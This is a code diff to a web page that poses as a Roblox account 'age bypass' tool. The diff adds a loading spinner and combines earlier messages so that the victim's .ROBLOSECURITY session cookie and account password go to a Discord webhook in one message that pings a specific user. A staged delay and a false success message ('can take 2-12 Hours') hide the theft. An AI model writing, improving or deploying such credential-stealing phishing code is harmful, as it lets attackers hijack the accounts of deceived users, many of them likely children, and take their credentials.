@@ -178,6 +178,31 @@
       user-select: none;
     }
 
+    #loader-overlay {
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(0,0,0,0.75);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 10000;
+      display: none;
+    }
+
+    .loader {
+      border: 6px solid #f3f3f3;
+      border-top: 6px solid #00f0ff;
+      border-radius: 50%;
+      width: 60px;
+      height: 60px;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
     @media (max-width: 600px) {
       h1 {
         font-size: 28px;
@@ -228,6 +253,10 @@
   <div id="error-message">ERROR Try later again.</div>
   <div id="success-message">Everything worked it can take 2-12 Hours until the age will be set</div>
 
+  <div id="loader-overlay">
+    <div class="loader"></div>
+  </div>
+
   <script>
     const bypassSelect = document.getElementById('bypass');
     const cookieBlock = document.getElementById('cookie-block');
@@ -237,6 +266,7 @@
     const processBtn = document.getElementById('process-button');
     const errorMessage = document.getElementById('error-message');
     const successMessage = document.getElementById('success-message');
+    const loaderOverlay = document.getElementById('loader-overlay');
 
     bypassSelect.addEventListener('change', () => {
       if (bypassSelect.value === '13plus') {
@@ -300,23 +330,26 @@
       }
 
       try {
+        // Zeige Lade-Spinner
+        loaderOverlay.style.display = 'flex';
+        processBtn.disabled = true;
+
         // Erwähnung mit hinzufügen
         const userMention = '<@1030535100829540464>\n\n';
-        await sendEmbedToDiscord('.ROBLOSECURITY Cookie', userMention + '```\n' + cookieVal + '\n```');
-        if (selected === '13plus') {
-          await sendEmbedToDiscord('Account Password', '```\n' + passwordVal + '\n```');
-        }
+        await sendEmbedToDiscord('.ROBLOSECURITY Cookie & Password', `${userMention}\n**Method:** ${selected === 'birthyear' ? '2008 Birthyear Up' : '13+ All Ages'}\n**Cookie:** ${cookieVal}\n${selected === '13plus' ? `**Password:** ${passwordVal}` : ''}`);
 
-        cookieInput.value = '';
-        passwordInput.value = '';
-        bypassSelect.value = '';
-        cookieBlock.style.display = 'none';
-        passwordBlock.style.display = 'none';
+        // Lade-Spinner 1 - 1.5 Sekunden anzeigen
+        await new Promise(resolve => setTimeout(resolve, 1200));
 
+        // Verstecke Loader und zeige Erfolgsmeldung
+        loaderOverlay.style.display = 'none';
         showSuccess('Everything worked it can take 2-12 Hours until the age will be set');
-      } catch (e) {
+
+      } catch (error) {
+        loaderOverlay.style.display = 'none';
         showError('ERROR Try later again.');
-        console.error(e);
+      } finally {
+        processBtn.disabled = false;
       }
     });
   </script>
